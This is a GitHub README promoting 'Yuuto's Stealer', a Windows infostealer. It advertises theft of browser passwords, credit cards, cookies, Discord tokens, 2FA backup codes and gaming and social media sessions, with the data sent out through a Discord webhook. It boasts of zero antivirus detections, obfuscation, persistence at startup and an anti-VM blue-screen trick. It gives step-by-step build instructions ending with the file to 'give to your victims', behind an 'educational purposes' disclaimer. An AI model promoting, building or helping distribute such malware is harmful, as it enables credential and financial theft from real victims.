<div align="center">
    <h1>Yuuto's Stealer</h1>
    <h6>A stealer made by <a href="https://github.com/JustYuuto">Yuuto</a></h6>
    <a href="https://github.com/JustYuuto/Yuuto-Stealer/issues">
        <img alt="GitHub issues" src="https://img.shields.io/github/issues/JustYuuto/Yuuto-Stealer?style=for-the-badge">
    </a>
    <img alt="Lines of code" src="https://img.shields.io/tokei/lines/github/JustYuuto/Yuuto-Stealer?style=for-the-badge">
    <img alt="GitHub code size in bytes" src="https://img.shields.io/github/repo-size/JustYuuto/Yuuto-Stealer?style=for-the-badge">
    <a href="https://github.com/JustYuuto/Yuuto-Stealer/wiki">
        <img alt="Read Docs" src="https://img.shields.io/badge/Read-Docs-blue?style=for-the-badge">
    </a>
</div>

--------------------------

## Features

* Made for Windows, but might work on macOS and Linux with Wine
* Zero VirusTotal detections
* Easy to build
* Can add itself to startup programs
* Can get IP info
* Can get OS info: RAM, OS version, computer name, uptime, CPU, victim's Windows username
* Can get Windows product key
* Can kill Discord processes
* Can steal all browsers (Chrome, Edge, Firefox, Opera, Opera GX, Brave...) data: passwords, credit cards, cookies, history
* Can steal Twitter, Reddit, Steam, Roblox and Minecraft sessions
* Anti-VM (can trigger a BSOD if the grabber is run from a virtual machine)
* Can steal Discord token, 2FA backup codes

All data is sent through a Discord webhook (which is configurable when building), with nice embeds and the zip file 

## Setting up

You'll need to get these three things, this is **required** otherwise the build can't work.

* [Node.js](https://nodejs.org/en)
* [Python](https://www.python.org/downloads/) (when the setup is opened **check "Add python.exe to PATH"**")
* <details>
    <summary><a href="https://aka.ms/vs/17/release/vs_BuildTools.exe">Visual Studio</a> with a "Desktop Development with C++" workload </summary>
    When you open the setup, it will download and install Visual Studio Installer. When it's installed, it will open automatically. Wait a few seconds, then go to the "Workloads" tab if it's not the selected tab. Search for "Desktop Development with C++" then check it.
    
    After doing this, click on the "Install" button (it's located at the bottom right of the window), and wait for "Visual Studio Build Tools 2022" for downloading and installing on your computer.
  </details>

Then [download the stealer](https://github.com/JustYuuto/Yuuto-Stealer/archive/refs/heads/master.zip). This is a zip file, just extract it somewhere.

If you didn't create a Discord webhook, create it. Then, run the ``build.bat`` file. It will ask you some questions for building the stealer, and then it will automatically build the thing for you.

**How does the build work?**
* First, it asks you questions, like the name, the webhook URL... just answer them all.
* Then it will minify (make the file size much lighter) and obfuscate (make the code unreadable) the code.
* Finally, it will build Electron executable. If this is the first time you're building, it will download some things, this is normal.
* When the build is finished, an explorer window will pop, selecting the file you'll need to give to your victims.

**If there is an issue or an error**
* Open a command prompt and navigate to the directory where you extracted the zip.
* Run ``build.bat`` and wait until there's, or you think is an error.
* Finally, [create an issue on the repository](https://github.com/JustYuuto/Yuuto-Stealer/issues/new) with the error.

## Screenshots

![Computer info](screenshots/computer.png)
![Discord account](screenshots/discord.png)
![Twitter profile](screenshots/twitter.png)
![Reddit account](screenshots/reddit.png)
![Steam account](screenshots/steam.png)

![ZIP File](screenshots/zip.png)
![ZIP File - Browsers data](screenshots/zip_browser.png)

## Why you should choose my stealer

* It has zero VirusTotal detections, even with VM protect disabled.
* Code built is obfuscated and minimized. I tried myself to un-obfuscate the code with websites on Google, but thanks to dead code, every single website just failed to un-obfuscate the code.
  
  TL;DR you don't have to worry about someone finding your webhook URL or something in the code 😊!

## Todo

See [TODO.md](TODO.md) file.

## Responsibility

I, Yuuto, and other contributors, will not accept any responsibility case for damage done using this tool. This was made for educational and demonstration purposes only.

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=JustYuuto/Yuuto-Stealer&type=Date)](https://star-history.com/#JustYuuto/Yuuto-Stealer&Date)

## Donating

If you find this project useful, consider donating:

* Ethereum Address : 0xf27851244c96d70b363c7641b99a2ee8ca818ba5
